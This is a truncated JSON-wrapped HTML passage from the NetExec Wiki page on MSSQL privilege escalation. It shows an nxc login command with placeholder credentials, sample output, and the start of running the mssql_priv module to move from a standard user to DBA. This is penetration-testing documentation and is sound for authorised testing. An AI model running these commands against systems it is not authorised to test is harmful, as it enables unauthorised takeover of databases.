{"title": "MSSQL PrivEsc", "source": "netexec", "source_label": "NetExec Wiki", "path": "mssql-protocol/mssql-privesc", "html": "<hr />\n<h2 id=\"description-module-to-privesc-from-standard-user-to-dba\">description: Module to privesc from standard user to DBA</h2>\n<h1 id=\"mssql-privesc\">MSSQL Privesc</h1>\n<h2 id=\"normal-authentication\">Normal Authentication</h2>\n<pre><code class=\"language-bash\">nxc mssql &lt;ip&gt; -u user -p password</code></pre>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>mssql<span class=\"w\"> </span>&lt;ip&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>user<span class=\"w\"> </span>-p<span class=\"w\"> </span>password<span class=\"w\">                       </span>\nMSSQL<span class=\"w\">       </span>&lt;ip&gt;<span class=\"w\">   </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Windows<span class=\"w\"> </span><span class=\"m\">10</span><span class=\"w\"> </span>/<span class=\"w\"> </span>Server<span class=\"w\"> </span><span class=\"m\">2019</span><span class=\"w\"> </span>Build<span class=\"w\"> </span><span class=\"m\">17763</span><span class=\"w\"> </span><span class=\"o\">(</span>name:FQDN<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>domain:FQDN.local<span class=\"o\">)</span>\nMSSQL<span class=\"w\">       </span>&lt;ip&gt;<span class=\"w\">   </span><span class=\"m\">1433</span><span class=\"w\">   </span>FQDN<span class=\"w\">      </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>FQDN<span class=\"se\">\\u</span>ser:password\n</code></pre></div>\n<h2 id=\"expected-results-after-mssql_priv-module\">Expected Results After <strong>mssql_priv</strong> Module</h2>\n<pre><code class=\"language-bash\">nxc mssql &lt;ip&gt; -u user -p password -M mssql_priv</code></pre>\n<div class=\"highlight\